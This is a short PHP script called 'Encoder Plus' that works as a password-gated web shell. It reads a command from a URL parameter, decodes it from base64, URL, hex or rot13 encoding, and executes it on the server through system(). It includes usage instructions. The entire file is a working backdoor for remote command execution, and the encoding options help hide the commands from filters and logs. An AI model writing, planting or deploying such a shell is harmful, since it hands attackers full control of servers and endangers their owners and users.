<?php
// ================================================================
// ENCODER PLUS – Multi-Encoding Support (FIXED)
// ================================================================

// Auth sederhana
if (!isset($_GET['key']) || $_GET['key'] !== 'your_secret_key') {
    die('Access denied');
}

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $type = isset($_GET['type']) ? $_GET['type'] : 'base64';
    
    // Validasi type
    $allowed_types = ['base64', 'url', 'hex', 'rot13', 'none'];
    if (!in_array($type, $allowed_types)) {
        die('Invalid encoding type');
    }
    
    switch($type) {
        case 'base64': 
            $cmd = base64_decode($cmd, true); 
            if ($cmd === false) die('Invalid base64'); 
            break;
        case 'url': 
            $cmd = urldecode($cmd); 
            break;
        case 'hex': 
            $cmd = hex2bin($cmd); 
            if ($cmd === false) die('Invalid hex'); 
            break;
        case 'rot13': 
            $cmd = str_rot13($cmd); 
            break;
        case 'none': 
        default: 
            break;
    }
    
    system($cmd);
} else {
    echo "Usage: ?cmd=encoded_command&type=base64|url|hex|rot13|none&key=your_secret_key";
}
?>